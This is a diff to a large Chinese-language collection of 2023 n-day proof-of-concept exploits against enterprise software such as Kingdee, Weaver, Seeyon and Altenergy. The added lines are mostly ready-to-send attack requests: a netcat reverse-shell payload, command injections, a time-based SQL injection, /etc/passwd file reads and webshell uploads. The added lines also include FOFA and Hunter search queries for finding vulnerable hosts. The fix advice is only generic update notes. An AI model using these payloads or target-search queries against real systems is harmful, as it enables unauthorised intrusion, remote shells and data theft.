@@ -1,6 +1,6 @@
 #  2023年Nday整理（常用）
 
-**更新时间：2024年7月15日**
+**更新时间：2024年2月3日**
 
 **擅用 [Ctrl+f]**
 
@@ -3192,6 +3192,19 @@ Connection: close
 
 {"ap0":"{{payload}}","format":"3"}
 
+# 疑似POC7：金蝶云星空AccountService反序列化漏洞
+POST /Kingdee.BOS.ServiceFacade.ServicesStub.Account.AccountService.GetDataCenterList.common.kdsvc HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+Content-Length: 15907
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Content-Type: text/json
+cmd: whoami
+Connection: close
+
+{"ap0":"{{payload}}","format":"3"}
+
 # 如果URL不对，可以在URL前加上/K3Cloud/，如/K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc
 ```
 
@@ -4211,6 +4224,7 @@ AlAltenergy Power System Control Software C1.2.5
 ### POC
 
 ```
+# title="Altenergy Power Control Software"
 POST /index.php/management/set_timezone HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 Content-Length: 73
@@ -4225,6 +4239,15 @@ Accept-Language: en-US,en;q=0.9
 Connection: close
 
 timezone=`mknod /tmp/backpipe p ;/bin/sh 0</tmp/backpipe | nc xxx.xxx.xxx.xxx 4444 1>/tmp/backpipe`
+
+# 执行命令，访问/rce.txt查看命令执行结果。
+POST /index.php/management/set_timezone HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+ 
+timezone=`id > rce.txt`
 ```
 
 https://github.com/ahmedalroky/Disclosures/blob/main/apesystems/os_command_injection.md
@@ -7221,6 +7244,7 @@ Content-Disposition: form-data; name="aaa"
 ### POC
 
 ```
+# header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
 # 这是第一份。
 POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 
 Host: 
@@ -8186,7 +8210,7 @@ Connection: close
 
 
 
-## 201. 明源云 ERP ApiUpdate.ashx 文件上传漏洞
+## 201. 明源云ERP ApiUpdate.ashx 文件上传漏洞
 
 >披露时间：-
 >
@@ -8857,6 +8881,7 @@ Content-Length: 39
 checkname=123&tagid=123
 
 # sqlmap -u "https://****/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" -v3 --skip-waf --random-agent
+# checkname=123&tagid=123 AND 8475=(SELECT 8475 FROM PG_SLEEP(5))-- BAUh
 ```
 
 ### 修复建议
@@ -8997,8 +9022,8 @@ Content-Disposition: form-data; name="__hash__"
 
 ```
 POST /changepass.php?type=2 
-
 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}
+
 old_pass=&password=Test123!@&repassword=Test123!@
 ```
 
@@ -9341,6 +9366,7 @@ exec master..xp_cmdshell 'whoami';
 ### POC
 
 ```
+# fofa：app="用友-NC-Cloud"
 # 访问地址：/fs/;/console，然后把响应包中的false改成true即可绕过。
 HTTP/1.1 200 OK
 Server: Apache-Coyote/1.1
@@ -10835,6 +10861,8 @@ Content-Type: application/octet-stream
 /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=..%5C..%5C..%5CC6%5CJhSoft.Web.Dossier.JG%5CJhSoft.Web.Dossier.JG%5CXMLFile%5COracleDbConn.xml
 
 /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml
+
+/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/Jhsoft.Web.module/fceform/sql/mysql.sql
 ```
 
 ### 修复建议
@@ -10883,7 +10911,7 @@ SOAPAction: "http://tempuri.org/CheckScheduleTime"
 
 
 
-## 258. 云课网校系统任意文件上传漏洞
+## 258. 云课网校系统uploadImage任意文件上传漏洞
 
 >披露时间：-
 >
@@ -10899,6 +10927,7 @@ SOAPAction: "http://tempuri.org/CheckScheduleTime"
 
 ```
 # fofa:"/static/libs/common/jquery.stickyNavbar.min.js"
+# 上传路径为回显路径。
 POST /api/uploader/uploadImage HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate, br
@@ -12971,7 +13000,7 @@ Content-Type: application/josn
 
 
 
-## 305. 会捷通云视讯平台fileDownload任意文件读取漏洞
+## 305. 会捷通云视讯平台fileDownload任意文件读取漏洞（21年的老漏洞）
 
 >披露时间：-
 >
@@ -13001,6 +13030,21 @@ Content-Length: 46
 action=downloadBackupFile&fullPath=/etc/passwd
 
 # action=downloadBackupFile&fullPath=../etc/passwd
+
+# 或者
+POST /fileDownload?action=downloadBackupFile HTTP/1.1
+Host: 地址
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+fullPath=%2Fetc%2Fpasswd
 ```
 
 ### 修复建议
@@ -13573,7 +13617,7 @@ memos < v0.13.2
 
 
 
-## 321. 泛微ecology某接口 sql注入
+## 321. 泛微ecology系统接口BlogService存在SQL注入漏洞
 
 >披露时间：-
 >
@@ -13642,6 +13686,8 @@ Content-Length: 469
    </soapenv:Body>
 </soapenv:Envelope>
 ```
+
+https://mp.weixin.qq.com/s/4mJg0FuOOIBjZn-qTMSaeA
 
 ### 修复建议
 
@@ -19982,7 +20028,7 @@ Cloud Templates & Patterns collection <= 1.2.2
 
 
 
-## 466. 致远Seeyon OA getAjaxDataServlet XXE致远程代码执行漏洞
+## 466. 致远Seeyon OA getAjaxDataServlet XXE致远程代码执行漏洞(可能重复)
 
 >披露时间：-
 >
@@ -25279,7 +25325,7 @@ https://github.com/willchen0011/cve/blob/main/HongJing-sql.md
 
 
 
-## 590. 明源云 erp VisitorWeb_xmlHTTP.aspx sql注入
+## 590. 明源云erp VisitorWeb_xmlHTTP.aspx sql注入
 
 >披露时间：-
 >
@@ -25412,12 +25458,40 @@ exp:
 ### POC
 
 ```
+# fofa：title="移动信息服务管理" || body="URL=/zftal-mobile"
+# 文件上传地址：/zftal-mobile/oaFjUploadByType/409.jsp
+POST /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Accept: */*
+Content-Length: 457
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="yhm"
+
+123
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="zid"
+
+456
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="sign"
+
+789
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="409.jsp"
+Content-Type: text/plain
+
+111
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
 detail:
   ID: 4826
   Author: Neo
   Name: 正方OA任意文件上传漏洞
   Description: 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。
-      如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。
+    如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。
   Identifier:
     DVB: DVB-2023-4826
   VulnClass:
@@ -25432,7 +25506,7 @@ detail:
   Level: 3
   DisclosureDate: '2023-08-04'
   VulnImpact: 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。
-      如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。
+    如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。
   Is0day: true
   IncludeExp: false
   Weakable: false
@@ -25615,7 +25689,7 @@ Content-Disposition: form-data; name="submit"
 
 
 
-## 596. 福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞
+## 596. 福建科立讯通信有限公司指挥调度管理平台多个命令执行漏洞
 
 >披露时间：-
 >
@@ -25658,7 +25732,7 @@ custom/zx/fax/send_fax.php
       
 # POC3:
 api/client/autobridgecall.php?callee=1&roomid=`ls>1.txt`
-# POC4:
+# POC4，命令执行结果：/api/client/audiobroadcast/1.txt:
 /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt`
 ```
 
@@ -26452,7 +26526,7 @@ https://github.com/flyyue2001/cve/blob/main/smart_sql_updateos.md
 
 
 
-## 614. 天擎 未授权与sql注入
+## 614. 天擎 rptsvcsyncpoint未授权与sql注入
 
 >披露时间：-
 >
@@ -27128,6 +27202,7 @@ notdelay=true&command=ls
 
 ```
 # fofa：app="泛微-OA（e-cology）"
+# hunter：app.name=="泛微 e-cology 9.0 OA"
 # 获取到的内容为base64编码后的内容，base64解码即可。
 POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
 Host: your-ip
@@ -27160,34 +27235,6 @@ Content-Type: application/xml
 </param>
 </params>
 </methodCall>
-```
-
-### 修复建议
-
-建议您更新当前系统或软件至最新版，完成漏洞的修复。
-
-
-
-## 633. interlib3图书馆系统 clusterCircLoanService 反序列化漏洞
-
->披露时间：-
->
->CVE号：-
-
-### 影响版本
-
-```
--
-```
-
-### POC
-
-```
-# yakit 生成payload，利用链:CB1链，结果选hex。
-POST /interlib3/remote/service/clusterCircLoanService
-Content-Type: application/octet-stream
-
-{{hexdec(....)}}
 ```
 
 ### 修复建议
@@ -29754,7 +29801,7 @@ https://github.com/wy876/POC/blob/main/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86-%E7%
 
 
 
-## 692. 福建科立讯通信有限公司指挥调度管理平台RCE
+## 692. 福建科立讯通信有限公司指挥调度管理平台多个RCE漏洞
 
 >披露时间：-
 >
@@ -30190,6 +30237,7 @@ Content-Type: text/xml
 ### POC
 
 ```
+# 文件上传位置为回显位置。
 POST /Util/UploadApi HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -30230,7 +30278,8 @@ Content-Type: image/jpeg
 ### POC
 
 ```
-# fofa：body="东华医疗协同办公系统"
+# fofa：body="东华医疗协同办公系统" || 东华医疗协同办公系统
+# shell地址：/common/FCKeditor/UserFiles/123.jsp
 POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
 Host: xx.xx.xx.xx
 Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
@@ -30463,7 +30512,8 @@ http:
 ### POC
 
 ```
-# body="东华医疗协同办公系统"
+# body="东华医疗协同办公系统" || body="skin/charmBlue/css/dialog.css"
+# <@d_base64>参数中 base64编码为内存马payload
 POST /workflow/DemoDefinitionProxyServlet/111 HTTP/1.1
 Host: xx.xx.xx.xx
 Content-Length: 13283
@@ -30622,7 +30672,9 @@ https://github.com/yosef0x01/CVE-2023-26360
 ### POC
 
 ```
+# fofa：icon_hash="-1830859634"
 # shell地址：/php/phpinfo1111.php
+# 绝对路径：
 POST /php/addmediadata.php HTTP/1.1
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjRl2AHEKXG
 
@@ -30643,6 +30695,31 @@ Content-Disposition: form-data; name="fullpath"
 
 C:\ICPAS\Wnmp\WWW\php
 ------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
+
+# 相对路径：
+POST /php/addmediadata.php HTTP/1.1
+Host:
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)
+AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16
+Content-Length: 514
+Content-Type: multipart/form-data;boundary=de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f08
+Accept-Encoding: gzip, deflate, br
+Connection: close
+
+--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+Content-Disposition: form-data; name="fullpath"
+
+../
+--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+Content-Disposition: form-data; name="subpath"
+
+/
+--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: application/octet-stream
+
+<?php echo md5(1);unlink(__FILE__);?>
+--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--
 ```
 
 ### 修复建议
@@ -33689,6 +33766,7 @@ Connection: close
 ### POC
 
 ```
+# fofa：icon_hash="953405444"||app="Landray-OA系统"
 GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+ HTTP/1.1
 Host: your-ip
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
@@ -35088,6 +35166,7 @@ fileName=admin&mappingAddress=C:\Windows\win.ini
 
 ```
 # fofa："servlet/validateCodeServlet" || app="JeePlus"
+# fofa：(body="jeeplus.js" && body="/static/common/") || title="JeePlus 快速开发平台"
 /a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23
 # 或者
 /sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23
@@ -37613,7 +37692,7 @@ qypzfeaz19689315
 
 
 
-## 882. 广联达OA 任意用户登录
+## 882. 广联达OA系统GetSSOStamp接口存在任意用户登录
 
 >披露时间：-
 >
@@ -37628,6 +37707,7 @@ qypzfeaz19689315
 ### POC
 
 ```
+# fofa：header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
 POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
 Host: x
 Content-Type: text/xml; charset=utf-8
@@ -38328,6 +38408,7 @@ Connection: close
 ### POC
 
 ```
+# fofa：body="/CDGServer3/index.jsp"
 POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
